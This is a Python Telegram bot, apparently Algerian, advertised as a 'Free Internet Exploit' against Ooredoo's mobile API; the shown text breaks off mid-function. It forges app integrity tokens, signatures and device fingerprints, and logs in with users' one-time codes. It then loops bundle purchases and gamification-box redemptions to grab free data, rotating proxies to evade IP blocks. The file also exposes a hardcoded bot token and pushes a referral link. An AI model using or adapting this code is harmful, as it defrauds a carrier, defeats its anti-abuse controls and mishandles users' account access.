#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🇩🇿 MATRIX BOT — Free Internet Exploit (5 Boxes, Webhook, Async, High-Concurrency)
Enhanced: Webhook + Cloudflare Tunnel, aiohttp async, proxy error reporting,
per-box internet size messages, TimeBucks support link, auto-delete error messages.
"""

import asyncio
import aiohttp
import aiofiles
import time
import re
import json
import logging
import sys
import uuid
import base64
import os
import urllib3
import random
import threading
import subprocess
import queue
from urllib.parse import urlencode, urlparse
from datetime import datetime, timezone
from aiohttp import web, ClientTimeout, TCPConnector
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ════════════════════════════════════════════════════════════════════════════
# LOGGING
# ════════════════════════════════════════════════════════════════════════════
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("bot.log", encoding="utf-8"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# ════════════════════════════════════════════════════════════════════════════
# CONFIG
# ════════════════════════════════════════════════════════════════════════════
TELEGRAM_BOT_TOKEN = "8177922042:AAENSzEnv83UanX9J8egYLeT09ioy9YbTkA"
TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

ADMIN_IDS = [8499896271]

LOG_CHANNEL_ID = ""
LOG_CHANNEL_USERNAME = "tasjil_bot_activation"

FORCED_CHANNELS_DEFAULT = ["@tasjilbott", "@tasjilapp"]
UNLIMITED_CODES = {"HAAAAQ", "SQAZZZ"}

WEBHOOK_PORT = 8443
WEBHOOK_PATH = f"/webhook/{TELEGRAM_BOT_TOKEN}"

TIMEBUCKS_LINK = "https://timebucks.com/?refID=227870531"

OOREDOO_BFF = "https://apis.ooredoo.dz/api/ooredoo-bff"
OOREDOO_AUTH = "https://apis.ooredoo.dz/api/auth/realms/myooredoo/protocol/openid-connect/token"
OOREDOO_CLIENT_ID = "myooredoo-app"
OOREDOO_X_VERSION = "1.5.17"
OOREDOO_X_SIG = "5c7641dbb82cf11066df68afc91541c967640106a95192740b43d51a5ce6777a"
OOREDOO_PLATFORM = "android"
OOREDOO_PLATFORM_ORIGIN = "mobile-android"

OOREDOO_INTEGRITY_1 = "JWBTpxXcH7KY9EXYeIRp8NjQMx2dt3vF8ejjoARazyoFzOw6Cu8+wkeV+zSVHSTeI6a12SG/FU+Q/9uBrcN71RlYO4CulD2x375NKwJRAInar8DVUilHBKUfjEsoHd6EwfLCfdYzLNXJu9POfEf6tqKn3PUe0pY6qZxWLhyVAFHw8Qwb52ZqdI2soCH4S3mrz+OZL+YovdGSUKlXKIkxVroAMTAg3jljLF7gvXaEsB/O3uW+tbkBMwSX2uTOwf+rh3sgOF/zPhKCFgRvZmU1o87Fa96Y/+wOcK+UpfXTCBYVrvQ1wG6ryC7vHMSqgUhYJK4tbSoti0zv4av9pwxh9Iv2MgsMENjyKBK/TuFZxEG3xQCKj1LTMgn2xBEeKcbsKrEW3xDRwsccGI3D7GHnbUlhdI4ujDIRQVKHaZSwhTp+32Cr4EB/Qt8p/xRbdgCde9MUlM4AYIGlfyVoHSkOvTu5c0DIIy1EhowtAkbKIJl49wsYKWvpT/nXFWzeXP3R2qzaclCnIb9qihhrarmwz8l8XH2T+f7AK2uSNiuWLG5Fy2mM/YLmuJPZT9Ciag/mpy7JGImKNQAcFbSAInBdKQjUKT+COzZfrXj5rwil9/HDMtuzIovq8hrQGY+roTfVPheTLWmcjkVCOL8VXAHjPb22vOuqrkMioWT9CQ5O8RgW7RKHrObeKQMp8F7tSjOqkxYDFkPVN1G4nkEBrTlPKK9YtPl+j7IuH9fGcDTwhCTTqP8peuBryW0L11tApvAEi7VkJyBxpVxW"
OOREDOO_INTEGRITY_2 = "JWBTpxXcH7KR/kzaHeUUydDWODuU4i3H4fL9gCgKzyYfyN4qLJJE8keV+zSVHSTeI6aEyC2tbSza/NGmkflQ/UgaNZSN9SKxz7tcdQckHY25n6mOaDZ9PPMQmF4sKZqDwebce/c1SNGNn6qvTULW/L348aJvy7Vii6dyPTu3OSPV9AwKwGwQKNHN61HyK3jx/fa8Os5ux9u3Q654YLZrAJ99QGEm/C9nEBPmlHC98RjovLGBnuJOGx6k7fnyrt/Ogy5fNg+tBgi5HEsoXDAwutX7TOWfx4YKHpKW//TvPRQgp69e2Xqa+CvGJJ+a/WlPMPhRCSsfo0OG04mVvlkc8eXiLzV/GPuJCEmcRf9Z6V+xoDyMtU7OZ3XT5BMhI/D/N68LsRn/9dIBH6X7n0WAW3tzeKZK1zENWFKrd7aLlzEdwFzO/1JTQsEDom5TRie0Kd5yic4BGvS1C1BsA2wJhzyiZ2j7RUE9m8tOAkPEIs929FYIfmH8XcCQKHT0TqT0+N+wCiyfNawPlDhZWcObscFZeEmKgvqiUFCoCj6xI1hvyHK0nu7fnZ/sGc6oNT/SrFjubYWjOyoYFL7gMnlYAhyjZhjuAwN1m1/wjwrOx8DbFr2NW8qb3hv+CIzK1zL3LDryKjqNkTxcOp4aJnmSTa73guCEmWc7pnLkLw5O8RgW7RKHrObeeQ0l9lu4HWXwlhdWRxvVMQDimhtTrGASL6sIuaxyhOkrH4HFImP70SaCoK9+euMxnzkPjg9HqPIFj+I0KSMloVxW"

# ════════════════════════════════════════════════════════════════════════════
# PROXY MANAGER (thread-safe, with admin error reporting)
# ════════════════════════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self):
        self._lock = threading.Lock()
        self._proxies = []
        self._enabled = False
        self._index = 0
        self._error_counts = {}   # url -> consecutive_error_count
        self._reported = set()    # urls already reported to admin this session
        self._error_threshold = 3 # report after this many consecutive failures

    def add(self, raw):
        raw = raw.strip()
        if not raw:
            return None
        ptype = "http"
        low = raw.lower()
        if low.startswith("socks5://") or low.startswith("socks4://") or low.startswith("socks://"):
            ptype = "socks"
            if low.startswith("socks://"):
                raw = "socks5://" + raw[len("socks://"):]
        elif low.startswith("https://"):
            ptype = "https"
        elif low.startswith("http://"):
            ptype = "http"
        else:
            raw = "http://" + raw
            ptype = "http"
        try:
            parsed = urlparse(raw)
            if not parsed.hostname:
                return None
            if not parsed.port:
                if ptype == "socks":
                    raw = raw.rstrip("/") + ":1080"
                elif ptype == "https":
                    raw = raw.rstrip("/") + ":443"
                else:
                    raw = raw.rstrip("/") + ":8080"
                parsed = urlparse(raw)
                if not parsed.port:
                    return None
        except Exception:
            return None
        with self._lock:
            for p in self._proxies:
                if p["url"] == raw:
                    return False
            self._proxies.append({"url": raw, "type": ptype})
        return True

    def remove(self, raw):
        raw = raw.strip()
        with self._lock:
            before = len(self._proxies)
            self._proxies = [p for p in self._proxies if p["url"] != raw]
            self._error_counts.pop(raw, None)
            self._reported.discard(raw)
            return len(self._proxies) < before

    def clear(self):
        with self._lock:
            self._proxies.clear()
            self._index = 0
            self._error_counts.clear()
            self._reported.clear()

    def toggle(self):
        with self._lock:
            self._enabled = not self._enabled
            return self._enabled

    def set_enabled(self, val):
        with self._lock:
            self._enabled = bool(val)

    @property
    def enabled(self):
        with self._lock:
            return self._enabled

    @property
    def count(self):
        with self._lock:
            return len(self._proxies)

    def list_all(self):
        with self._lock:
            return [dict(p) for p in self._proxies]

    def get_next(self):
        """Returns requests-compatible proxies dict or None if disabled/empty."""
        with self._lock:
            if not self._enabled or not self._proxies:
                return None
            p = self._proxies[self._index % len(self._proxies)]
            self._index = (self._index + 1) % len(self._proxies)
        return {"http": p["url"], "https": p["url"]}, p["url"]

    def report_error(self, proxy_url):
        """Track proxy errors; return True if threshold hit and not yet reported."""
        with self._lock:
            self._error_counts[proxy_url] = self._error_counts.get(proxy_url, 0) + 1
            count = self._error_counts[proxy_url]
            if count >= self._error_threshold and proxy_url not in self._reported:
                self._reported.add(proxy_url)
                return True, count
        return False, 0

    def report_success(self, proxy_url):
        """Reset error count on success."""
        with self._lock:
            self._error_counts.pop(proxy_url, None)
            self._reported.discard(proxy_url)

_proxy_mgr = ProxyManager()

# ════════════════════════════════════════════════════════════════════════════
# STATE STORAGE
# ════════════════════════════════════════════════════════════════════════════
DATA_FILE = "bot_data.json"
_lock = threading.RLock()
_save_lock = threading.Lock()
_save_pending = {"flag": False}

_users = {}
_sessions = {}
_devices = {}
_forced_channels = list(FORCED_CHANNELS_DEFAULT)
_bot_stats = {"users": 0, "activations": 0}
_maintenance = False
_activations_count = {}
_max_activations = 1
active_users = set()
active_users_lock = threading.Lock()
_unlimited_users = set()

def _do_save():
    with _save_lock:
        try:
            data = {
                "users": {str(k): v for k, v in _users.items()},
                "devices": {str(k): v for k, v in _devices.items()},
                "channels": _forced_channels,
                "stats": _bot_stats,
                "maintenance": _maintenance,
                "activations_count": _activations_count,
                "max_activations": _max_activations,
                "proxies": _proxy_mgr.list_all(),
                "proxy_enabled": _proxy_mgr.enabled,
                "unlimited_users": list(_unlimited_users),
            }
            tmp = DATA_FILE + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, separators=(',', ':'))
            os.replace(tmp, DATA_FILE)
            _save_pending["flag"] = False
        except Exception as e:
            logger.warning(f"save: {e}")

def _save_async():
    if _save_pending["flag"]:
        return
    _save_pending["flag"] = True
    threading.Thread(target=_do_save, daemon=True).start()

def _load_from_disk():
    global _users, _devices, _forced_channels, _bot_stats, _maintenance
    global _activations_count, _max_activations, _unlimited_users
    if not os.path.exists(DATA_FILE):
        return
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        _users = {int(k): v for k, v in data.get("users", {}).items()}
        _devices = {int(k): v for k, v in data.get("devices", {}).items()}
        _forced_channels = data.get("channels", list(FORCED_CHANNELS_DEFAULT))
        _bot_stats = data.get("stats", {"users": 0, "activations": 0})
        _maintenance = data.get("maintenance", False)
        _activations_count = data.get("activations_count", {})
        _max_activations = data.get("max_activations", 1)
        _unlimited_users = set(data.get("unlimited_users", []))
        for p in data.get("proxies", []):
            _proxy_mgr.add(p.get("url", ""))
        if data.get("proxy_enabled"):
            _proxy_mgr.set_enabled(True)
        logger.info(f"✅ Loaded {len(_users)} users | Max Activations: {_max_activations} | Proxies: {_proxy_mgr.count}")
    except Exception as e:
        logger.warning(f"load: {e}")

# ════════════════════════════════════════════════════════════════════════════
# HELPERS
# ════════════════════════════════════════════════════════════════════════════
def oo_get_user(chat_id):
    with _lock:
        return dict(_users.get(chat_id)) if _users.get(chat_id) else None

def oo_save_user(chat_id, data):
    with _lock:
        if chat_id not in _users:
            _users[chat_id] = {}
            _bot_stats["users"] += 1
        changed = False
        for k, v in data.items():
            if v is not None and _users[chat_id].get(k) != v:
                _users[chat_id][k] = v
                changed = True
    if changed:
        _save_async()

def oo_delete_user(chat_id):
    with _lock:
        _users.pop(chat_id, None)
    _save_async()

def oo_get_session(chat_id):
    with _lock:
        return dict(_sessions.get(chat_id)) if _sessions.get(chat_id) else {}

def oo_set_session(chat_id, data):
    with _lock:
        if chat_id not in _sessions:
            _sessions[chat_id] = {}
        _sessions[chat_id].update({k: v for k, v in data.items() if v is not None})

def oo_clear_session(chat_id):
    with _lock:
        _sessions.pop(chat_id, None)

def oo_get_device(chat_id):
    with _lock:
        if chat_id in _devices:
            return dict(_devices[chat_id])
    iid = oo_new_iid()
    psig = oo_new_psig(iid)
    d = {"instance_id": iid, "plat_sig": psig}
    with _lock:
        _devices[chat_id] = d
    _save_async()
    return dict(d)

def oo_now_ms():
    return str(int(time.time() * 1000))

def oo_new_iid():
    u = uuid.uuid4().hex
    return f"{u[:8]}-{u[8:12]}-11{u[12:16]}-{u[16:20]}-{u[20:32]}{oo_now_ms()}"

def oo_new_psig(iid):
    p = json.dumps({
        "platform": "android",
        "is-physical-device": True,
        "device-id": iid
    }, separators=(',', ':'))
    return base64.b64encode(p.encode()).decode()

def oo_new_corr():
    return uuid.uuid4().hex + oo_now_ms()

def oo_new_fp():
    return uuid.uuid4().hex + uuid.uuid4().hex[:32]

def oo_extract_did(token):
    try:
        p = token.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p)).get("device-id")
    except:
        return None

def mask_phone(m):
    if not m:
        return "—"
    s = str(m).strip()
    if s.startswith("213") and len(s) == 12:
        s = "0" + s[3:]
    if len(s) >= 8:
        return s[:2] + "x" * (len(s) - 4) + s[-2:]
    return s

def get_user_display(chat_id):
    u = oo_get_user(chat_id) or {}
    un = u.get("username")
    if un:
        return f"@{un}"
    return u.get("first_name") or "غير معروف"

# ════════════════════════════════════════════════════════════════════════════
# ASYNC HTTP (aiohttp) — HIGH CONCURRENCY CORE
# ════════════════════════════════════════════════════════════════════════════
# Shared aiohttp session — created once, reused across all requests
_aio_session: aiohttp.ClientSession = None
_aio_tg_session: aiohttp.ClientSession = None

def _make_connector():
    return TCPConnector(
        limit=500,           # max total connections
        limit_per_host=100,  # per-host pool
        ttl_dns_cache=300,
        use_dns_cache=True,
        ssl=False,
    )

async def _init_aio_sessions():
    global _aio_session, _aio_tg_session
    timeout = ClientTimeout(total=15, connect=5, sock_read=12)
    _aio_session = aiohttp.ClientSession(
        connector=_make_connector(),
        timeout=timeout,
    )
    tg_timeout = ClientTimeout(total=10, connect=3, sock_read=8)
    _aio_tg_session = aiohttp.ClientSession(
        connector=_make_connector(),
        timeout=tg_timeout,
    )

async def oo_http_async(method, url, headers, body="", timeout=12):
    """Async HTTP for Ooredoo API — full proxy support with error reporting."""
    proxy_result = _proxy_mgr.get_next()
    proxy_url = None
    proxy_dict = None
    if proxy_result:
        proxy_dict, proxy_url = proxy_result

    kwargs = {
        "headers": headers,
        "ssl": False,
    }
    if proxy_url:
        kwargs["proxy"] = proxy_url

    try:
        if method == "GET":
            async with _aio_session.get(url, **kwargs) as r:
                txt = await r.text()
                status = r.status
                resp_headers = {k.lower(): v for k, v in r.headers.items()}
        elif method == "POST":
            data = body if isinstance(body, str) else json.dumps(body)
            async with _aio_session.post(url, data=data, **kwargs) as r:
                txt = await r.text()
                status = r.status
                resp_headers = {k.lower(): v for k, v in r.headers.items()}
        else:
            return None

        if "Request Rejected" in txt or "<!DOCTYPE" in txt[:200]:
            if proxy_url:
                should_report, err_count = _proxy_mgr.report_error(proxy_url)
                if should_report:
                    asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, "IP محظور / Request Rejected"))
            return {"ip_blocked": True, "code": status, "body": txt}

        if proxy_url:
            _proxy_mgr.report_success(proxy_url)

        try:
            j = json.loads(txt)
        except:
            j = None
        return {
            "code": status,
            "body": txt,
            "headers": resp_headers,
            "json": j,
        }

    except aiohttp.ClientProxyConnectionError as e:
        logger.warning(f"proxy connect error [{proxy_url}]: {e}")
        if proxy_url:
            should_report, err_count = _proxy_mgr.report_error(proxy_url)
            if should_report:
                asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, f"خطأ اتصال: {type(e).__name__}"))
        return None
    except aiohttp.ServerTimeoutError as e:
        logger.warning(f"timeout [{proxy_url or 'direct'}]: {e}")
        if proxy_url:
            should_report, err_count = _proxy_mgr.report_error(proxy_url)
            if should_report:
                asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, "Timeout"))
        return None
    except Exception as e:
        logger.debug(f"oo_http_async error: {e}")
        if proxy_url:
            should_report, err_count = _proxy_mgr.report_error(proxy_url)
            if should_report:
                asyncio.create_task(_notify_admin_proxy_error(proxy_url, err_count, str(e)[:80]))
        return None

async def _notify_admin_proxy_error(proxy_url, err_count, reason):
    """Send proxy error alert to all admins."""
    msg = (
        f"⚠️ <b>تنبيه: بروكسي معطل</b>\n\n"
        f"🌐 <code>{proxy_url}</code>\n"
        f"❌ <b>السبب:</b> {reason}\n"
        f"🔢 <b>عدد الأخطاء المتتالية:</b> {err_count}\n"
        f"⏰ <b>الوقت:</b> {datetime.now(timezone.utc).strftime('%H:%M:%S UTC')}"
    )
    for admin_id in ADMIN_IDS:
        await tg_send_async_fn(admin_id, msg)

# ════════════════════════════════════════════════════════════════════════════
# TELEGRAM ASYNC (aiohttp)
# ════════════════════════════════════════════════════════════════════════════
async def tg_request_async(method, **kwargs):
    try:
        async with _aio_tg_session.post(
            f"{TELEGRAM_API}/{method}",
            json=kwargs,
        ) as r:
            return await r.json()
    except Exception as e:
        logger.debug(f"tg_request_async {method}: {e}")
        return None

async def tg_send_async_fn(chat_id, text, keyboard=None, parse_mode="HTML"):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
    if keyboard:
        payload["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    return await tg_request_async("sendMessage", **payload)

async def tg_buttons_async(chat_id, text, rows):
    keyboard = [[{"text": btn} for btn in row] for row in rows]
    return await tg_send_async_fn(chat_id, text, keyboard)

async def tg_delete_msg(chat_id, message_id):
    try:
        await tg_request_async("deleteMessage", chat_id=chat_id, message_id=message_id)
    except:
        pass

async def tg_send_then_delete(chat_id, text, rows=None, delay=5.0):
    """Send a message and auto-delete it after `delay` seconds."""
    if rows:
        keyboard = [[{"text": btn} for btn in row] for row in rows]
        result = await tg_request_async(
            "sendMessage",
            chat_id=chat_id,
            text=text,
            parse_mode="HTML",
            reply_markup={"keyboard": keyboard, "resize_keyboard": True}
        )
    else:
        result = await tg_request_async(
            "sendMessage",
            chat_id=chat_id,
            text=text,
            parse_mode="HTML",
        )
    if result and result.get("ok"):
        msg_id = result["result"]["message_id"]
        asyncio.create_task(_delayed_delete(chat_id, msg_id, delay))

async def _delayed_delete(chat_id, message_id, delay):
    await asyncio.sleep(delay)
    await tg_delete_msg(chat_id, message_id)

async def send_log(text):
    try:
        target = None
        if LOG_CHANNEL_ID and str(LOG_CHANNEL_ID).startswith("-100"):
            target = LOG_CHANNEL_ID
        elif LOG_CHANNEL_USERNAME:
            target = LOG_CHANNEL_USERNAME if LOG_CHANNEL_USERNAME.startswith("@") \
                else "@" + LOG_CHANNEL_USERNAME
        if target:
            await tg_request_async("sendMessage", chat_id=target,
                                   text=text, parse_mode="HTML")
    except Exception as e:
        logger.warning(f"send_log: {e}")

# ════════════════════════════════════════════════════════════════════════════
# HEADERS
# ════════════════════════════════════════════════════════════════════════════
def oo_base_h(msisdn, fp, corr, ts, iid, psig):
    return {
        "User-Agent": "Dart/3.11 (dart:io)",
        "Accept-Encoding": "gzip",
        "x-msisdn": msisdn,
        "x-device-fingerprint": fp,
        "x-platform-origin": OOREDOO_PLATFORM_ORIGIN,
        "x-correlation-id": corr,
        "platform": OOREDOO_PLATFORM,
        "x-version": OOREDOO_X_VERSION,
        "x-signature": OOREDOO_X_SIG,
        "x-platform-data-signature": psig,
        "x-timestamp": ts,
        "x-instance-id": iid,
    }

def oo_authed_h(msisdn, token, tokh):
    ts = tokh.get("tok_timestamp") or oo_now_ms()
    iid = tokh.get("tok_instance_id") or oo_new_iid()
    psig = tokh.get("tok_plat_sig") or oo_new_psig(iid)
    return {
        "User-Agent": "Dart/3.11 (dart:io)",
        "Accept-Encoding": "gzip",
        "x-msisdn": msisdn,
        "x-device-fingerprint": oo_new_fp(),
        "x-platform-origin": "web",
        "authorization": f"Bearer {token}",
        "x-correlation-id": oo_new_corr(),
        "platform": "web",
        "x-version": OOREDOO_X_VERSION,
        "x-signature": OOREDOO_X_SIG,
        "x-platform-data-signature": psig,
        "x-timestamp": ts,
        "x-instance-id": iid,
        "origin": "https://my.ooredoo.dz",
        "referer": "https://my.ooredoo.dz/",
    }

# ════════════════════════════════════════════════════════════════════════════
# OOREDOO OTP (async)
# ════════════════════════════════════════════════════════════════════════════
async def oo_send_otp(msisdn, device):
    iid = device["instance_id"]
    psig = device["plat_sig"]
    ts = oo_now_ms()

    h3 = oo_base_h(msisdn, oo_new_fp(), oo_new_corr(), ts, iid, psig)
    h3.update({
        "content-type": "application/json; charset=utf-8",
        "x-native-integrity-token": OOREDOO_INTEGRITY_1,
        "x-path": "/api/auth/realms/myooredoo/protocol/openid-connect/token",
        "x-method": "POST",
    })
    r3 = await oo_http_async("POST", f"{OOREDOO_BFF}/checkpoint/token", h3, "{}")
    if not r3 or r3.get("ip_blocked"):
        logger.warning("send_otp: checkpoint failed or IP blocked")
        return None

    nonce = r3["headers"].get("x-nonce-id")
    chronos = r3["headers"].get("x-chronos-id")
    if not nonce or not chronos:
        logger.warning("send_otp: missing nonce/chronos")
        return None

    h4 = {
        "User-Agent": "Dart/3.11 (dart:io)",
        "x-msisdn": msisdn,
        "x-device-fingerprint": oo_new_fp(),
        "x-nonce-id": nonce,
        "x-platform-origin": OOREDOO_PLATFORM_ORIGIN,
        "platform": OOREDOO_PLATFORM,
        "x-version": OOREDOO_X_VERSION,
        "x-signature": OOREDOO_X_SIG,
        "x-chronos-id": chronos,
        "x-timestamp": ts,
        "x-platform-info": psig,
        "x-force-update": "true",
        "x-instance-id": iid,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    b4 = urlencode({
        "client_id": OOREDOO_CLIENT_ID,
        "grant_type": "password",
        "username": msisdn,
    })
    r4 = await oo_http_async("POST", OOREDOO_AUTH, h4, b4)
    if r4 and not r4.get("ip_blocked"):
        logger.info(f"send_otp: HTTP {r4.get('code')}")
        return {"ok": True}
    logger.warning("send_otp: failed to reach auth")
    return None

async def oo_verify_otp(msisdn, otp, device):
    iid = device["instance_id"]
    psig = device["plat_sig"]
    ts = oo_now_ms()

    h6 = oo_base_h(msisdn, oo_new_fp(), oo_new_corr(), ts, iid, psig)
    h6.update({
        "content-type": "application/json; charset=utf-8",
        "x-native-integrity-token": OOREDOO_INTEGRITY_2,
        "x-path": "/api/auth/realms/myooredoo/protocol/openid-connect/token",
        "x-method": "POST",
    })
    r6 = await oo_http_async("POST", f"{OOREDOO_BFF}/checkpoint/token", h6, "{}")
    if not r6 or r6.get("ip_blocked"):
        return None

    n2 = r6["headers"].get("x-nonce-id")
    c2 = r6["headers"].get("x-chronos-id")
    if not n2 or not c2:
        return None

    fp7 = oo_new_fp()
    h7 = {
        "User-Agent": "Dart/3.11 (dart:io)",
        "x-msisdn": msisdn,
        "x-device-fingerprint": fp7,
        "x-nonce-id": n2,
        "x-platform-origin": OOREDOO_PLATFORM_ORIGIN,
        "platform": OOREDOO_PLATFORM,
        "x-version": OOREDOO_X_VERSION,
        "x-signature": OOREDOO_X_SIG,
        "x-chronos-id": c2,
        "x-timestamp": ts,
        "x-platform-info": psig,
        "x-force-update": "true",
        "x-instance-id": iid,
        "Content-Type": "application/x-www-form-urlencoded",
    }
    b7 = urlencode({
        "client_id": OOREDOO_CLIENT_ID,
        "grant_type": "password",
        "username": msisdn,
        "otp": otp,
    })
    r7 = await oo_http_async("POST", OOREDOO_AUTH, h7, b7)

    if not r7:
        return None
    code = r7.get("code")
    if code in (400, 401, 403):
        return "wrong_otp"
    if code == 200 and r7.get("json") and "access_token" in r7["json"]:
        j = r7["json"]
        return {
            "access_token": j["access_token"],
            "refresh_token": j.get("refresh_token", ""),
            "tok_fingerprint": fp7,
            "tok_timestamp": ts,
            "tok_instance_id": oo_extract_did(j["access_token"]) or iid,
            "tok_plat_sig": psig,
            "tok_correlation": oo_new_corr(),
        }
    return None

# ════════════════════════════════════════════════════════════════════════════
# EXPLOIT — 5 BOXES (Fully Async, Per-Box Live Messages, High Concurrency)
# ════════════════════════════════════════════════════════════════════════════
async def _single_box_attempt_async(i, user, m):
    """One full box cycle — async. Returns (value, unit, success)."""
    try:
        iid = user.get("tok_instance_id") or oo_new_iid()
        psig = user.get("tok_plat_sig") or oo_new_psig(iid)
        tok_info = {
            "tok_timestamp": user.get("tok_timestamp"),
            "tok_instance_id": iid,
            "tok_plat_sig": psig,
        }

        # 1. Purchase
        h_buy = oo_authed_h(m, user.get("access_token"), tok_info)
        h_buy["content-type"] = "application/json; charset=utf-8"
        payload = {"msisdn": m, "bundleCode": "DATA_100_KTM"}
        await oo_http_async("POST", f"{OOREDOO_BFF}/bundle/bundlePurchase/v2",
                            h_buy, json.dumps(payload))

        await asyncio.sleep(random.uniform(2.0, 3.0))

        # 2. Fetch available boxes
        h_box = oo_authed_h(m, user.get("access_token"), tok_info)
        r_box = await oo_http_async(
            "GET",
            f"{OOREDOO_BFF}/gamification/power-snake?status=AVAILABLE",
            h_box
        )
        if not r_box or r_box.get("code") != 200:
            return 0.0, "", False

        items = r_box.get("json", {}).get("items", [])
        if not items:
            return 0.0, "", False

        box_uuid = items[0].get("uuid")

        # 3. Redeem
        h_redeem = oo_authed_h(m, user.get("access_token"), tok_info)
        h_redeem["content-type"] = "application/json"
        r_redeem = await oo_http_async(
            "POST",
            f"{OOREDOO_BFF}/gamification/power-snake/{box_uuid}/redeem",
            h_redeem, ""
        )
        if r_redeem and r_redeem.get("code") == 200:
            assigned = r_redeem.get("json", {}).get("assignedReward", {})
            reward = assigned.get("reward", {})
            try:
                val = float(reward.get("usage-value", 0))
            except Exception:
                val = 0.0
            unit = reward.get("usage-unit", "")
            return val, unit, True
        return 0.0, "", False
    except Exception as e:
        logger.error(f"Box attempt {i+1} error: {e}")
        return 0.0, "", False

async def run_5_boxes(chat_id, user, unlimited=False):
    total_val = 0.0
    total_unit = ""
    m = user.get("msisdn", "")
    done_count = 0
    box_results = []

    try:
        mode = "بدون قيد 🔓" if unlimited else "عادي"
        await tg_send_async_fn(
            chat_id,
            f"⏳ <b>جاري تفعيل 5 صناديق... ({mode})</b>\n\nيرجى الانتظار..."
        )

        # Boxes run sequentially (each depends on prior purchase step)
        for i in range(5):
            val, unit, ok = await _single_box_attempt_async(i, user, m)
            if ok:
                total_val += val
                total_unit = unit or total_unit
                done_count += 1
                box_results.append((val, unit))
                # Per-box live message
                await tg_send_async_fn(
                    chat_id,
                    f"📦 <b>الصندوق {i+1}/5</b>\n"
                    f"{'✅ نجح' if ok else '❌ فشل'} — <b>{val} {unit}</b> انترنت"
                )
            else:
                box_results.append((0.0, ""))
                await tg_send_async_fn(
                    chat_id,
                    f"📦 <b>الصندوق {i+1}/5</b>\n❌ لم ينجح هذا الصندوق"
                )
            await asyncio.sleep(random.uniform(0.8, 1.2))

        # Update counters
        with _lock:
            if not unlimited:
                _activations_count[m] = _activations_count.get(m, 0) + 1
            _bot_stats["activations"] += 1
        _save_async()

        # Log to channel
        user_str = get_user_display(chat_id)
        masked = mask_phone(m)
        utc_time = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        log_msg = (
            f"🎉 <b>تفعيل جديد (5 صناديق)</b>\n\n"
            f"👤 <b>المستخدم:</b> {user_str}\n"
            f"🆔 <b>ID:</b> <code>{chat_id}</code>\n"
            f"📱 <b>الرقم:</b> <code>{masked}</code>\n"
            f"🎁 <b>نوع العرض:</b> انترنت مجاني\n"
            f"🔓 <b>الوضع:</b> {'بدون قيد' if unlimited else 'عادي'}\n"
            f"💰 <b>المجموع:</b> {total_val} {total_unit}\n"
            f"📦 <b>الصناديق المفتوحة:</b> {done_count}/5\n"
            f"🕐 <b>الوقت:</b> {utc_time}"
        )
        asyncio.create_task(send_log(log_msg))

        # Final success message with TimeBucks support link
        box_detail_lines = "\n".join(
            f"  📦 الصندوق {idx+1}: {'✅ ' + str(v) + ' ' + u if v > 0 else '❌ فشل'}"
            for idx, (v, u) in enumerate(box_results)
        )
        msg_text = (
            f"✅ <b>اكتمل التفعيل!</b>\n\n"
            f"<b>تفاصيل كل صندوق:</b>\n{box_detail_lines}\n\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📊 <b>النتيجة النهائية</b>\n"
            f"📦 الصناديق الناجحة: <b>{done_count}/5</b>\n"
            f"💰 إجمالي الانترنت: <b>{total_val} {total_unit}</b>\n"
            f"📱 الرقم: <code>{masked}</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n\n"
            f"💙 <b>إذا كنت تريد دعمنا حتى نستمر، قم بالدخول للموقع والتسجيل بحساب Google:</b>\n"
            f"🔗 <a href='{TIMEBUCKS_LINK}'>timebucks.com — سجّل بحساب Google</a>"
        )
        await tg_buttons_async(chat_id, msg_text, [["🔙 رجوع للقائمة"]])

    except Exception as e:
        logger.exception(f"run_5_boxes fatal: {e}")
        try:
            await tg_buttons_async(chat_id, "⚠️ حدث خطأ أثناء التفعيل. حاول مجدداً.",
                                   [["🔙 رجوع للقائمة"]])
        except:
            pass
    finally:
        with active_users_lock:
            active_users.discard(chat_id)

async def oo_do_open_box(chat_id, user, unlimited=False):
    with active_users_lock:
        if chat_id in active_users:
            await tg_send_async_fn(chat_id, "⚠️ لديك عملية تفعيل قيد التنفيذ. يرجى الانتظار.")
            return
        active_users.add(chat_id)

    m = user.get("msisdn", "")
    if not unlimited:
        with _lock:
            count = _activations_count.get(m, 0)
        if count >= _max_activations and chat_id not in ADMIN_IDS:
            with active_users_lock:
                active_users.discard(chat_id)
            await tg_buttons_async(
                chat_id,
                f"❌ لقد استنفدت الحد الأقصى ({_max_activations}) لهذا الرقم.\n"
                f"استخدم كود التفعيل بدون قيد للحصول على تفعيل غير محدود.",
                [["🔓 تفعيل بدون قيد"], ["🔙 رجوع للقائمة"]]
            )
            return

    asyncio.create_task(run_5_boxes(chat_id, user, unlimited))

# ════════════════════════════════════════════════════════════════════════════
# FORCE SUBSCRIBE
# ════════════════════════════════════════════════════════════════════════════
_sub_cache = {}
_sub_cache_lock = threading.Lock()
_SUB_CACHE_TTL = 30

async def check_sub(chat_id):
    if not _forced_channels:
        return True
    if chat_id in ADMIN_IDS:
        return True
    now = time.time()
    with _sub_cache_lock:
        entry = _sub_cache.get(chat_id)
        if entry and now - entry[0] < _SUB_CACHE_TTL:
            return entry[1]

    ok = True
    for ch in _forced_channels:
        try:
            async with _aio_tg_session.get(
                f"{TELEGRAM_API}/getChatMember",
                params={"chat_id": ch, "user_id": chat_id}
            ) as r:
                j = await r.json()
            if not j.get("ok"):
